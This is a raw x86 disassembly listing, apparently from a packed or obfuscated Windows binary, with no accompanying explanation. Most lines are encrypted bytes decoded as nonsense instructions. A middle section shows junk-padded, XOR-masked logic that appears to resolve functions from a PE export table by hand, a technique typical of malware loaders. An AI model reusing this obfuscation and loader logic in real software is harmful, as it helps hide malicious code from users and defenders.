  4063cb:	lods   eax,DWORD PTR ds:[esi]
  4063cc:	xor    BYTE PTR [esi-0x1d6d217e],ah
  4063d2:	jg     0x4063cd
  4063d4:	push   ebp
  4063d5:	cmp    esp,DWORD PTR [eax+0xbb02653]
  4063db:	or     cl,BYTE PTR [esi+ebx*1]
  4063de:	dec    al
  4063e0:	adc    DWORD PTR [eax-0x53],ebp
  4063e3:	and    DWORD PTR [ebp-0x2dcc3a27],edi
  4063e9:	enter  0x30c9,0x18
  4063ed:	mov    WORD PTR [edi],cs
  4063ef:	mov    ds:0x55ef718,al
  4063f4:	push   edi
  4063f5:	shl    DWORD PTR [edi+0x6f],1
  4063f8:	enter  0x257,0x4d
  4063fc:	dec    esp
  4063fd:	xchg   ebx,eax
  4063fe:	jno    0x4063a8
  406400:	lock jmp 0x738a:0xaf2a36b7
  406408:	icebp  
  406409:	cmp    al,0x35
  40640b:	outs   dx,BYTE PTR ds:[esi]
  40640c:	inc    eax
  40640d:	outs   dx,BYTE PTR ds:[esi]
  40640e:	pop    esi
  40640f:	push   esp
  406410:	scas   al,BYTE PTR es:[edi]
  406411:	or     al,0xc1
  406413:	sub    al,0x11
  406415:	(bad)  
  406416:	(bad)  
  406417:	jle    0x4063a6
  406419:	mov    cl,0x53
  40641b:	retf   
  40641c:	arpl   ax,bx
  40641e:	ja     0x406417
  406420:	fucom  st(2)
  406422:	push   ecx
  406423:	rol    DWORD PTR [esi],0x55
  406426:	xor    ebp,DWORD PTR [edx+0x72]
  406429:	add    eax,0x70b0cdda
  40642e:	in     eax,0x75
  406430:	aas    
  406431:	dec    di
  406433:	nop
  406434:	lods   al,BYTE PTR ds:[esi]
  406435:	push   ebx
  406436:	loopne 0x406493
  406438:	mov    ds:0xdf2dcbb,eax
  40643d:	mov    dl,0xb6
  40643f:	popa   
  406440:	sub    eax,0x861f7f1e
  406445:	dec    ebp
  406446:	xchg   DWORD PTR [ecx-0x48],eax
  406449:	jmp    0x9333:0x844599a0
  406450:	pop    edi
  406451:	daa    
  406452:	or     DWORD PTR [edx+eax*2+0x37ba6110],eax
  406459:	jb     0x406465
  40645b:	lea    ecx,[ebp+0x5d]
  40645e:	xchg   ecx,eax
  40645f:	bound  esi,QWORD PTR [eax+0x74]
  406462:	cmp    dh,al
  406464:	imul   ebp,DWORD PTR [eax-0x4ad2deca],0xb9acc564
  40646e:	in     eax,dx
  40646f:	push   0x334c68c4
  406474:	cdq    
  406475:	call   0x7b22:0xde2391c
  40647c:	and    al,0x6e
  40647e:	and    ecx,DWORD PTR [ebp+0x7c117a49]
  406484:	les    esi,FWORD PTR [edi+0x54]
  406487:	leave  
  406488:	xor    edi,ebx
  40648a:	outs   dx,BYTE PTR ds:[esi]
  40648b:	gs in  eax,0x51
  40648e:	rcr    BYTE PTR [esi+0x21],cl
  406491:	dec    esp
  406492:	shl    BYTE PTR ds:0x599089d3,cl
  406498:	sub    BYTE PTR [si-0x53],al
  40649c:	out    0xce,eax
  40649e:	hlt    
  40649f:	into   
  4064a0:	in     al,0xc5
  4064a2:	iret   
  4064a3:	fldl2e 
  4064a5:	into   
  4064a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4064a7:	sub    al,BYTE PTR [eax+0x18]
  4064aa:	pop    esi
  4064ab:	and    eax,0x1060003c
  4064b0:	xor    ecx,DWORD PTR [esi]
  4064b2:	fild   WORD PTR [ebp+0x25]
  4064b5:	mov    ds:0x7e02ae39,eax
  4064ba:	test   eax,0xad3277ed
  4064bf:	stos   BYTE PTR es:[edi],al
  4064c0:	add    eax,0xbfcfd60b
  4064c5:	(bad)  
  4064c6:	fnstsw WORD PTR [ecx-0x554911c8]
  4064cc:	mov    es,WORD PTR [edx+0x55cd2c97]
  4064d2:	sub    ah,BYTE PTR [edx+0x4d0cc94d]
  4064d8:	ret    
  4064d9:	loopne 0x4064ff
  4064db:	or     bl,bl
  4064dd:	mov    ah,0xa8
  4064df:	repnz shl BYTE PTR [ecx+0x77994fbb],1
  4064e6:	push   0x35be90ad
  4064eb:	ja     0x40651e
  4064ed:	push   eax
  4064ee:	mov    eax,0x4e7c624a
  4064f3:	cmp    al,dh
  4064f5:	js     0x406574
  4064f7:	push   0x61de9c9e
  4064fc:	(bad)  
  4064fd:	retf   0xc88f
  406500:	(bad)  [eax]
  406502:	addr16 sbb al,0xc8
  406505:	adc    edx,DWORD PTR [eax]
  406507:	jmp    0x40653a
  406509:	aad    0x24
  40650b:	je     0x4064c4
  40650d:	or     eax,0xd4e87c3f
  406512:	xor    BYTE PTR [ecx],dh
  406514:	push   ecx
  406515:	mov    eax,ds:0xd44db098
  40651a:	mov    es,WORD PTR [edx-0x78]
  40651d:	fmul   DWORD PTR [edx+0x4726c7d0]
  406523:	jl     0x4064d9
  406525:	loop   0x40656f
  406527:	mov    BYTE PTR [edx+0x18],0x80
  40652b:	test   al,0x1d
  40652d:	stos   DWORD PTR es:[edi],eax
  40652e:	pop    ss
  40652f:	imul   edi,DWORD PTR [ebx],0x10
  406532:	or     al,0xb0
  406534:	clc    
  406535:	jg     0x406519
  406537:	xchg   edi,eax
  406538:	add    eax,0x13c3f6ab
  40653d:	jmp    0x36a4:0xcfb942a7
  406544:	pop    ss
  406545:	hlt    
  406546:	adc    al,0xa
  406548:	mov    eax,ds:0xfbba6595
  40654d:	(bad)  
  40654e:	daa    
  40654f:	xor    DWORD PTR [edi],eax
  406551:	inc    ebp
  406552:	xor    al,0xc9
  406554:	adc    al,0x10
  406556:	loope  0x4065c7
  406558:	test   DWORD PTR [ecx-0x5c],edx
  40655b:	pop    ecx
  40655c:	aas    
  40655d:	mov    edi,0xaf377b
  406562:	imul   ebx
  406564:	inc    dx
  406566:	mov    esp,0x76500b39
  40656b:	fild   QWORD PTR [ebp+0x2a78b2bc]
  406571:	imul   esp,DWORD PTR ds:0xafa1b376,0x35648c44
  40657b:	sub    al,0xc
  40657d:	stos   DWORD PTR es:[edi],eax
  40657e:	adc    al,0x4c
  406580:	or     ch,dh
  406582:	inc    eax
  406583:	enter  0x6765,0x47
  406587:	sub    DWORD PTR [ebp+0x4f],ebp
  40658a:	sti    
  40658b:	ffreep st(1)
  40658d:	dec    ebp
  40658e:	dec    ecx
  40658f:	mov    cl,0x18
  406591:	mov    eax,0x44a16e8
  406596:	and    cl,BYTE PTR [ebx-0x4715f9d6]
  40659c:	test   DWORD PTR [ebx+0x28c5ad24],edi
  4065a2:	jnp    0x40653f
  4065a4:	inc    ecx
  4065a5:	repz push ebp
  4065a7:	add    al,BYTE PTR [ebp-0x116b5d45]
  4065ad:	inc    ebx
  4065ae:	ss mov edx,0xfa01c243
  4065b4:	out    dx,eax
  4065b5:	sub    BYTE PTR [esp+ecx*4+0x1c1ae4c9],ah
  4065bc:	pop    esp
  4065bd:	cmp    dl,bl
  4065bf:	out    dx,eax
  4065c0:	jno    0x406552
  4065c2:	add    eax,0x35e768f
  4065c7:	adc    eax,0x1975873e
  4065cc:	ret    0xe76c
  4065cf:	je     0x406631
  4065d1:	push   esi
  4065d2:	pop    ss
  4065d3:	pop    esi
  4065d4:	and    eax,0x5c6e2755
  4065d9:	add    ecx,DWORD PTR [eax+0x490821ff]
  4065df:	mov    al,0x33
  4065e1:	dec    edi
  4065e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4065e3:	sbb    al,0x95
  4065e5:	fdiv   QWORD PTR [ebx-0x6e]
  4065e8:	xchg   ecx,eax
  4065e9:	lea    edx,[esi-0x3272db]
  4065ef:	sbb    DWORD PTR ds:0x426000,0x42900c
  4065f9:	xor    ecx,ebx
  4065fb:	xor    DWORD PTR ds:0x425008,0xe68
  406605:	xor    edx,ebx
  406607:	mov    DWORD PTR ds:0x427008,0xa36
  406611:	cmp    edx,ecx
  406613:	mov    DWORD PTR ds:0x425000,0x1171
  40661d:	je     0x40684c
  406623:	mov    ecx,DWORD PTR [ebp-0x4]
  406626:	xor    ecx,ebx
  406628:	adc    DWORD PTR ds:0x427000,0x2a26
  406632:	add    ecx,eax
  406634:	cmp    esi,ecx
  406636:	jne    0x4067ef
  40663c:	push   DWORD PTR [ebp+0x8]
  40663f:	call   0x415b52
  406644:	mov    ecx,DWORD PTR ds:0x41d28c
  40664a:	mov    ecx,DWORD PTR [ecx]
  40664c:	and    DWORD PTR ds:0x42900c,ecx
  406652:	mov    DWORD PTR [ebp-0x18],eax
  406655:	mov    eax,DWORD PTR [ebp-0x4]
  406658:	mov    DWORD PTR ds:0x428018,0x10
  406662:	cmp    DWORD PTR ds:0x428018,0x0
  406669:	je     0x4066c2
  40666f:	cmp    DWORD PTR ds:0x428018,0x7
  406676:	jne    0x406685
  40667c:	push   DWORD PTR [ebp-0x28]
  40667f:	call   DWORD PTR ds:0x421004
  406685:	cmp    DWORD PTR ds:0x428018,0x8
  40668c:	jne    0x40669f
  406692:	mov    edi,DWORD PTR ds:0x428018
  406698:	dec    edi
  406699:	mov    DWORD PTR ds:0x428018,edi
  40669f:	mov    edi,DWORD PTR ds:0x428018
  4066a5:	dec    edi
  4066a6:	mov    DWORD PTR ds:0x428018,edi
  4066ac:	jmp    0x406662
  4066b1:	mov    ecx,DWORD PTR ds:0x41ffef
  4066b7:	mov    edi,DWORD PTR ds:0x41d254
  4066bd:	sub    edi,ecx
  4066bf:	add    ecx,DWORD PTR [ecx+edi*1]
  4066c2:	mov    ecx,DWORD PTR [ebp-0x18]
  4066c5:	xor    eax,ebx
  4066c7:	mov    edi,0x3272db
  4066cc:	add    eax,edi
  4066ce:	mov    DWORD PTR ds:0x425008,0x2bfa
  4066d8:	cmp    ecx,eax
  4066da:	je     0x4068bc
  4066e0:	sbb    DWORD PTR ds:0x426000,0x426010
  4066ea:	push   DWORD PTR [ebp-0x18]
  4066ed:	push   DWORD PTR [ebp+0x8]
  4066f0:	call   0x417fa0
  4066f5:	sbb    DWORD PTR ds:0x42601c,ecx
  4066fb:	mov    DWORD PTR [ebp-0x18],eax
  4066fe:	dec    eax
  4066ff:	mov    eax,DWORD PTR [ebp-0x4]
  406702:	and    DWORD PTR ds:0x425018,0x0
  40670c:	jmp    0x40671e
  406711:	mov    ecx,DWORD PTR ds:0x425018
  406717:	inc    ecx
  406718:	mov    DWORD PTR ds:0x425018,ecx
  40671e:	cmp    DWORD PTR ds:0x425018,0x1e
  406725:	jae    0x40674c
  40672b:	cmp    DWORD PTR ds:0x425018,0x2e
  406732:	jne    0x406741
  406738:	push   DWORD PTR [ebp-0x20]
  40673b:	call   DWORD PTR ds:0x421048
  406741:	jmp    0x406711
  406746:	sbb    ecx,DWORD PTR ds:0x42900c
  40674c:	mov    ecx,DWORD PTR [ebp-0x18]
  40674f:	xor    DWORD PTR ds:0x425000,0x426004
  406759:	xor    eax,ebx
  40675b:	sub    DWORD PTR ds:0x42900c,0x26ad
  406765:	add    eax,edi
  406767:	cmp    ecx,eax
  406769:	mov    DWORD PTR ds:0x42501c,0x148e
  406773:	je     0x4068bc
  406779:	mov    eax,DWORD PTR [ebp-0x18]
  40677c:	mov    eax,DWORD PTR [eax+0x18]
  40677f:	mov    ecx,DWORD PTR ds:0x42500c
  406785:	or     DWORD PTR ds:0x428014,ecx
  40678b:	mov    DWORD PTR [ebp-0x24],eax
  40678e:	mov    eax,DWORD PTR [ebp-0x18]
  406791:	mov    ecx,DWORD PTR [ebp+0x8]
  406794:	add    ecx,DWORD PTR [eax+0x20]
  406797:	mov    DWORD PTR [ebp-0x2c],ecx
  40679a:	and    eax,eax
  40679c:	mov    eax,DWORD PTR [ebp-0x18]
  40679f:	and    ecx,DWORD PTR ds:0x427000
  4067a5:	mov    ecx,DWORD PTR [ebp+0x8]
  4067a8:	adc    DWORD PTR ds:0x425004,0x721
  4067b2:	add    ecx,DWORD PTR [eax+0x24]
  4067b5:	movzx  eax,WORD PTR ds:0x428004
  4067bc:	sbb    eax,DWORD PTR ds:0x42801c
  4067c2:	mov    ds:0x428004,eax
  4067c7:	mov    DWORD PTR [ebp-0x34],ecx
  4067ca:	or     DWORD PTR ds:0x429008,edx
  4067d0:	mov    eax,DWORD PTR [ebp-0x18]
  4067d3:	mov    ecx,DWORD PTR [ebp+0x8]
  4067d6:	sbb    DWORD PTR ds:0x427018,0x427008
  4067e0:	add    ecx,DWORD PTR [eax+0x1c]
  4067e3:	not    eax
  4067e5:	mov    eax,edi
  4067e7:	mov    DWORD PTR [ebp-0x18],ecx
  4067ea:	jmp    0x406884
  4067ef:	movzx  ecx,BYTE PTR ds:0x428010
  4067f6:	add    ecx,DWORD PTR ds:0x42700c
  4067fc:	mov    DWORD PTR ds:0x428010,ecx
  406802:	mov    ecx,DWORD PTR [ebp-0x2c]
  406805:	xor    DWORD PTR ds:0x425004,edi
  40680b:	mov    edx,DWORD PTR [ebp+0x8]
  40680e:	and    DWORD PTR ds:0x425020,0x42901c
  406818:	add    edx,DWORD PTR [ecx+esi*4]
  40681b:	inc    ecx
  40681c:	mov    DWORD PTR [ebp-0x28],edx
  40681f:	sub    DWORD PTR ds:0x425000,ecx
  406825:	mov    ecx,DWORD PTR [ebp-0x4]
  406828:	sbb    DWORD PTR ds:0x42500c,0xc10
  406832:	mov    edx,DWORD PTR [ebp-0x28]
  406835:	xor    ecx,ebx
  406837:	dec    DWORD PTR ds:0x42600c
  40683d:	add    ecx,eax
  40683f:	cmp    edx,ecx
  406841:	je     0x406884
  406847:	jmp    0x406870
  40684c:	mov    ecx,DWORD PTR [ebp-0x4]
  40684f:	mov    edx,DWORD PTR [ebp-0x8]
  406852:	xor    ecx,ebx
  406854:	add    ecx,eax
  406856:	cmp    edx,ecx
  406858:	je     0x4068c8
  40685e:	mov    ecx,DWORD PTR [ebp-0x4]
  406861:	mov    edx,DWORD PTR [ebp-0x30]
  406864:	xor    ecx,ebx
  406866:	add    ecx,eax
  406868:	cmp    edx,ecx
  40686a:	je     0x4068d7
  406870:	lea    eax,[ebp-0x8]
  406873:	push   eax
  406874:	push   DWORD PTR [ebp-0x28]
  406877:	push   DWORD PTR [ebp+0xc]
  40687a:	call   0x401000
  40687f:	mov    eax,0x3272db
  406884:	mov    ecx,DWORD PTR [ebp-0x4]
  406887:	mov    edx,DWORD PTR [ebp-0x8]
  40688a:	xor    ecx,ebx
  40688c:	add    ecx,eax
  40688e:	cmp    edx,ecx
  406890:	je     0x4068ab
  406896:	mov    ecx,DWORD PTR [ebp-0x34]
  406899:	movzx  ecx,WORD PTR [ecx+esi*2]
  40689d:	mov    edx,DWORD PTR [ebp-0x18]
  4068a0:	mov    ecx,DWORD PTR [edx+ecx*4]
  4068a3:	mov    DWORD PTR [ebp-0x38],ecx
  4068a6:	jmp    0x40684c
  4068ab:	mov    ecx,DWORD PTR [ebp-0x14]
  4068ae:	xor    ecx,ebx
  4068b0:	lea    esi,[esi+ecx*1+0x3272db]
  4068b7:	jmp    0x40427f
  4068bc:	mov    eax,DWORD PTR [ebp-0x4]
  4068bf:	xor    eax,ebx
  4068c1:	add    eax,edi
  4068c3:	jmp    0x408d90
  4068c8:	mov    eax,DWORD PTR [ebp-0x4]
  4068cb:	xor    eax,ebx
  4068cd:	add    eax,0x3272db
  4068d2:	jmp    0x408d90
  4068d7:	mov    ecx,DWORD PTR [ebp-0x38]
  4068da:	add    ecx,DWORD PTR [ebp+0x8]
  4068dd:	mov    DWORD PTR [ebp-0x10],ecx
  4068e0:	mov    ecx,DWORD PTR [ebp-0x1c]
  4068e3:	test   ecx,ecx
  4068e5:	je     0x408d1b
  4068eb:	mov    DWORD PTR [ebp-0x20],0x0
  4068f2:	push   0x3
  4068f4:	xor    edx,edx
  4068f6:	pop    edx
  4068f7:	add    edx,0x8
  4068fa:	push   edx
  4068fb:	pop    ecx
  4068fc:	push   0x6
  4068fe:	dec    ecx
  4068ff:	pop    ebx
  406900:	dec    ebx
  406901:	xchg   ebx,ecx
  406903:	sub    ebx,ecx
  406905:	xchg   ebx,ecx
  406907:	dec    ecx
  406908:	mov    eax,DWORD PTR [ebp-0x1c]
  40690b:	imul   eax,ecx
  40690e:	sub    esp,eax
  406910:	mov    DWORD PTR [ebp-0x20],esp
  406913:	mov    eax,DWORD PTR [ebp-0x4]
  406916:	mov    ecx,0x7510893
  40691b:	xor    eax,ecx
  40691d:	mov    edx,0x3272db
  406922:	add    eax,edx
  406924:	mov    DWORD PTR [ebp+0x8],eax
  406927:	mov    eax,DWORD PTR [ebp-0x14]
  40692a:	xor    eax,ecx
  40692c:	add    eax,edx
  40692e:	mov    edx,DWORD PTR [ebp+0x14]
  406931:	imul   eax,DWORD PTR [edx]
  406934:	mov    edx,DWORD PTR [ebp-0x4]
  406937:	xor    edx,ecx
  406939:	mov    ecx,DWORD PTR [ebp+0x8]
  40693c:	lea    ecx,[edx+ecx*1+0x3272db]
  406943:	cmp    ecx,eax
  406945:	je     0x408d11
  40694b:	mov    edi,DWORD PTR [ebp-0x14]
  40694e:	mov    eax,DWORD PTR [ebp+0x8]
  406951:	mov    edx,DWORD PTR [ebp+0x14]
  406954:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  406958:	mov    ecx,0x7510893
  40695d:	xor    edx,edx
  40695f:	xor    edi,ecx
  406961:	mov    esi,0x3272db
  406966:	add    edi,esi
  406968:	div    edi
  40696a:	mov    edx,DWORD PTR [ebp-0x4]
  40696d:	xor    edx,ecx
  40696f:	lea    eax,[edx+eax*1+0x3272db]
  406976:	mov    edx,DWORD PTR [ebp+0x8]
  406979:	mov    edi,DWORD PTR [ebp-0x20]
  40697c:	mov    DWORD PTR [edi+edx*4],eax
  40697f:	mov    eax,DWORD PTR [ebp-0x14]
  406982:	mov    edx,DWORD PTR [ebp+0x8]
  406985:	xor    eax,ecx
  406987:	lea    eax,[eax+edx*1+0x3272db]
  40698e:	mov    DWORD PTR [ebp+0x8],eax
  406991:	mov    eax,DWORD PTR [ebp-0x14]
  406994:	mov    edx,DWORD PTR [ebp+0x14]
  406997:	xor    eax,ecx
  406999:	add    eax,esi
  40699b:	imul   eax,DWORD PTR [edx]
  40699e:	mov    edx,DWORD PTR [ebp-0x4]
  4069a1:	xor    edx,ecx
  4069a3:	mov    ecx,DWORD PTR [ebp+0x8]
  4069a6:	lea    ecx,[edx+ecx*1+0x3272db]
  4069ad:	cmp    ecx,eax
  4069af:	jmp    0x408d04
  4069b4:	into   
  4069b5:	mov    BYTE PTR [ecx],bl
  4069b7:	(bad)  
  4069b8:	adc    esp,DWORD PTR [ebx+0x10b2688d]
  4069be:	shl    DWORD PTR [ebx+0x7c],0x55
  4069c2:	out    0xa0,al
  4069c4:	ret    0x623c
  4069c7:	bound  ebp,QWORD PTR [edx]
  4069c9:	pop    edi
  4069ca:	bound  esp,QWORD PTR [edx+0x6d]
  4069cd:	pop    edi
  4069ce:	push   0x7931d676
  4069d3:	cmp    ah,BYTE PTR [edx]
  4069d5:	je     0x406a35
  4069d7:	inc    edx
  4069d8:	stos   BYTE PTR es:[edi],al
  4069d9:	add    BYTE PTR [esi],dl
  4069db:	jns    0x4069b2
  4069dd:	xchg   ecx,eax
  4069de:	mov    esp,0x56a03060
  4069e3:	(bad)  
  4069e4:	ds in  eax,0x3d
  4069e7:	int    0x2f
  4069e9:	push   ss
  4069ea:	loop   0x4069e0
  4069ec:	outs   dx,DWORD PTR ds:[esi]
  4069ed:	inc    ebp
  4069ee:	stc    
  4069ef:	(bad)  
  4069f0:	(bad)  
  4069f1:	mov    ah,0x68
  4069f3:	push   es
  4069f4:	nop
  4069f5:	shr    eax,1
  4069f7:	cmp    ebp,ebx
  4069f9:	dec    esp
  4069fa:	loop   0x406a0c
  4069fc:	and    BYTE PTR [edi],0x79
  4069ff:	(bad)  
  406a00:	jp     0x4069eb
  406a02:	in     al,0x60
  406a04:	mov    esi,0xdffc05dd
  406a09:	sub    DWORD PTR [ecx+0x27],eax
  406a0c:	ds jmp 0x406a08
  406a0f:	dec    ecx
  406a10:	cdq    
  406a11:	test   eax,eax
  406a13:	cld    
  406a14:	in     al,dx
  406a15:	dec    ebx
  406a16:	xchg   ax,ax
  406a18:	push   ss
  406a19:	mov    ds:0x3d4c80f1,al
  406a1e:	mov    cs,WORD PTR [ebx+0x0]
  406a21:	inc    ebp
  406a22:	les    ecx,FWORD PTR [ecx+0x325933cb]
  406a28:	rcr    DWORD PTR [edi+edi*4+0x4a79e34a],cl
  406a2f:	sub    al,0x15
  406a32:	fidivr WORD PTR [ebp-0x7ef48ee1]
  406a38:	dec    esi
  406a39:	mov    eax,ds:0xf5b19ef0
  406a3e:	out    0xfe,eax
  406a40:	xor    al,0xd0
  406a42:	xor    cl,BYTE PTR [esi-0x55d4a88]
  406a48:	add    dl,BYTE PTR [esi+0x1d2ebc5a]
  406a4e:	fisttp DWORD PTR [ebx-0x6d17dee8]
  406a54:	sbb    al,0xc9
  406a57:	aas    
  406a58:	or     esi,ebp
  406a5a:	or     dl,ch
  406a5c:	jecxz  0x4069ec
  406a5e:	or     al,0x2f
  406a60:	push   ds
  406a61:	ins    DWORD PTR es:[edi],dx
  406a62:	jns    0x406aa7
  406a64:	adc    esi,ebx
  406a66:	ret    0xd950
  406a69:	mov    al,0x82
  406a6b:	dec    ebp
  406a6c:	adc    al,0x4d
  406a6e:	inc    eax
  406a6f:	and    eax,0x9cc48525
  406a74:	xor    ebp,DWORD PTR [edi+0xd0659cd]
  406a7a:	cmp    dl,ah
  406a7c:	and    al,0x1e
  406a7e:	add    al,0xcc
  406a81:	neg    BYTE PTR [ecx+0xb]
  406a84:	es shr dl,0xa5
  406a88:	dec    ecx
  406a89:	in     eax,0xb9
  406a8b:	add    dl,al
  406a8d:	outs   dx,DWORD PTR ds:[esi]
  406a8e:	jecxz  0x406a31
  406a90:	retf   0x7b10
  406a93:	das    
  406a94:	xor    eax,0xa68874a9
  406a99:	cmc    
  406a9a:	xchg   ebp,eax
  406a9b:	jbe    0x406ae7
  406a9d:	inc    esp
  406a9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406a9f:	pusha  
  406aa0:	inc    edi
  406aa1:	icebp  
  406aa2:	outs   dx,BYTE PTR ds:[esi]
  406aa3:	adc    ebx,DWORD PTR [eax]
  406aa5:	std    
  406aa6:	inc    esi
  406aa7:	mov    es,WORD PTR [edi]
  406aa9:	sub    esp,DWORD PTR [esi-0x6c]
  406aac:	mov    dh,0xc2
  406aae:	mov    DWORD PTR [ecx],ecx
  406ab0:	leave  
  406ab1:	add    eax,0xe872c884
  406ab6:	fbld   TBYTE PTR [esi+0x444ffbc6]
  406abc:	loope  0x406aa4
  406abe:	mov    DWORD PTR [edx+0x60],ebx
  406ac1:	test   eax,0xef387872
  406ac6:	pop    ds
  406ac7:	push   ecx
  406ac8:	cmp    eax,DWORD PTR [si+0x6b]
  406acc:	push   es
  406acd:	je     0x406aac
  406acf:	jbe    0x406af5
  406ad1:	call   0xb544:0x7094
  406ad7:	loope  0x406ad8
  406ad9:	(bad)  
  406ada:	call   edi
  406adc:	inc    esi
  406add:	shr    BYTE PTR [edi],1
  406adf:	lds    edx,FWORD PTR [ebp-0x6a68fd00]
  406ae5:	sub    ch,0xfc
  406ae8:	je     0x406b57
  406aea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406aeb:	sbb    al,dh
  406aed:	jle    0x406a76
  406aef:	icebp  
  406af0:	cwde   
  406af1:	jg     0x406a7b
  406af3:	rcr    DWORD PTR [esi],0x95
  406af6:	and    BYTE PTR [ebx-0x75],ch
  406af9:	xor    DWORD PTR [ecx-0x2e],ecx
  406afc:	stos   DWORD PTR es:[edi],eax
  406afd:	rol    bl,cl
  406aff:	xchg   ebx,eax
  406b00:	jnp    0x406ac9
  406b02:	std    
  406b03:	adc    eax,0x71c6f7fe
  406b08:	stos   BYTE PTR es:[edi],al
  406b09:	loop   0x406acf
  406b0b:	mov    eax,0xa7a9a908
  406b10:	std    
  406b11:	pop    esp
  406b12:	lods   al,BYTE PTR ds:[esi]
  406b13:	dec    BYTE PTR [ebp+0x5a]
  406b16:	add    bh,BYTE PTR [edx-0x2d]
  406b19:	xchg   esi,eax
  406b1a:	dec    eax
  406b1b:	jecxz  0x406b83
  406b1d:	jecxz  0x406b06
  406b1f:	add    dl,BYTE PTR [esi+0x54]
  406b22:	adc    DWORD PTR [ebx-0x39e9f8df],ecx
  406b28:	inc    esi
  406b29:	dec    ebp
  406b2a:	and    BYTE PTR [ebp+esi*4+0x28],ch
  406b2e:	cmp    edx,esi
  406b30:	loope  0x406b3f
  406b32:	cld    
  406b33:	fcmovnu st,st(0)
  406b35:	scas   al,BYTE PTR es:[edi]
  406b36:	cmp    eax,DWORD PTR [ebx+0x1760f637]
  406b3c:	mov    dh,0x9a
  406b3e:	mov    dh,0x58
  406b40:	jb     0x406ae0
  406b42:	lods   eax,DWORD PTR ds:[esi]
  406b43:	dec    esp
  406b44:	cmp    BYTE PTR [edx],dh
  406b46:	jne    0x406b44
  406b48:	xlat   BYTE PTR ds:[ebx]
  406b49:	add    ah,ch
  406b4b:	ss sbb al,0xbc
  406b4e:	outs   dx,DWORD PTR ds:[esi]
  406b4f:	inc    esp
  406b50:	xor    BYTE PTR [ebx+0x7e],ch
  406b53:	cdq    
  406b54:	sti    
  406b55:	cmp    dl,BYTE PTR [edi-0x42]
  406b58:	sub    al,0x1d
  406b5a:	mov    ebx,0xcd67ca95
  406b5f:	xlat   BYTE PTR ds:[ebx]
  406b60:	ds repnz stc 
  406b63:	sub    DWORD PTR [edi+edx*4-0x59],0x1769c6f0
  406b6b:	push   edx
  406b6c:	nop
  406b6d:	and    edi,esi
  406b6f:	xchg   esp,eax
  406b70:	in     al,dx
  406b71:	sub    eax,0xcf8fd02c
  406b76:	push   0x14
  406b78:	and    DWORD PTR [ecx+edi*4+0x77],edx
  406b7c:	mov    ah,0xdd
  406b7e:	push   eax
  406b7f:	pop    ebp
  406b80:	mov    ah,0x67
  406b82:	cmc    
  406b83:	adc    BYTE PTR [edi-0x36],ah
  406b86:	jo     0x406b14
  406b88:	das    
  406b89:	inc    esp
  406b8a:	into   
  406b8b:	out    dx,eax
  406b8c:	dec    ebp
  406b8d:	mov    al,ds:0x69fcd686
  406b92:	and    DWORD PTR [edi-0x46],ecx
  406b95:	dec    esp
  406b96:	mov    ebp,0xf5c8e1a5
  406b9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406b9c:	mov    edi,0xee2081d2
  406ba1:	jbe    0x406c02
  406ba3:	mov    WORD PTR [edi+ebp*8+0x1622e9b],ss
  406baa:	bound  esi,QWORD PTR [eax-0x19]
  406bad:	leave  
  406bae:	jmp    0xfd21:0x6497f639
  406bb5:	lahf   
  406bb6:	test   al,0xa9
  406bb8:	xchg   DWORD PTR [ebx],edx
  406bba:	imul   edi,DWORD PTR [ebp+0x48],0x620aa2fe
  406bc1:	popa   
  406bc2:	jo     0x406bd6
  406bc4:	add    al,0xe3
  406bc6:	cmp    eax,0x21087690
  406bcb:	adc    eax,0x64dc1fce
  406bd0:	mov    ds:0x380283b1,al
  406bd5:	jno    0x406be1
  406bd7:	pop    edx
  406bd8:	jns    0x406bcd
  406bda:	outs   dx,BYTE PTR ds:[esi]
  406bdb:	push   esp
  406bdc:	(bad)  
  406bdd:	cdq    
  406bde:	pusha  
  406bdf:	dec    edx
  406be0:	cmc    
  406be1:	pop    edi
  406be2:	adc    eax,0x3286578d
  406be7:	lahf   
  406be8:	jno    0x406c2f
  406bea:	xor    edi,DWORD PTR [ecx]
  406bec:	pop    ds
  406bed:	mov    bl,0x49
  406bef:	fsub   DWORD PTR [ebp-0x21a1468d]
  406bf5:	jo     0x406b7c
  406bf7:	or     al,0xb8
  406bf9:	mov    DWORD PTR ds:0xf78bd5e,0x2984cb97
  406c03:	mov    eax,ds:0x3af0b68f
  406c08:	sbb    bl,BYTE PTR [eax-0x4e]
  406c0b:	stos   BYTE PTR es:[edi],al
  406c0c:	out    0x0,al
  406c0e:	xchg   ebx,eax
  406c0f:	add    eax,0x75cf4cc
  406c14:	(bad)  
  406c15:	stos   DWORD PTR es:[edi],eax
  406c16:	xchg   edi,eax
  406c17:	das    
  406c18:	push   esp
  406c19:	jecxz  0x406be2
  406c1b:	sar    DWORD PTR [ebx+0x11021278],0x3f
  406c22:	lods   eax,DWORD PTR ds:[esi]
  406c23:	lods   al,BYTE PTR ds:[esi]
  406c24:	(bad)  
  406c25:	out    dx,al
  406c26:	lods   al,BYTE PTR ds:[esi]
  406c27:	std    
  406c28:	mov    ecx,0x1d1a0326
  406c2d:	mov    ah,BYTE PTR [edx+edx*2]
  406c30:	aam    0x6a
  406c32:	xor    DWORD PTR [ebp+0x5],esi
  406c35:	addr16 push es
  406c37:	jbe    0x406be1
  406c39:	push   esi
  406c3a:	mov    al,0x6a
  406c3c:	retf   0x93f
  406c3f:	(bad)  
  406c40:	repnz mov edx,0x8197b569
  406c46:	inc    ebx
  406c47:	in     al,dx
  406c48:	mov    ds:0xb403c4ad,eax
  406c4d:	xor    bh,BYTE PTR [ecx+0x5a72a95b]
  406c53:	mov    WORD PTR [edi],?
  406c55:	xchg   edi,eax
  406c56:	jg     0x406c02
  406c58:	or     bh,ah
  406c5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c5b:	mov    BYTE PTR [edi+ebp*4],al
  406c5e:	adc    ebp,eax
  406c60:	fadd   DWORD PTR [esi+edi*2]
  406c63:	out    dx,eax
  406c64:	lds    ebx,FWORD PTR [esi-0x7d593f89]
  406c6a:	fiadd  DWORD PTR [esi-0x18bbc3fa]
  406c70:	mov    bl,0xd
  406c72:	lahf   
  406c73:	sti    
  406c74:	inc    DWORD PTR [ecx]
  406c76:	shl    edi,1
  406c78:	popa   
  406c79:	xchg   edi,eax
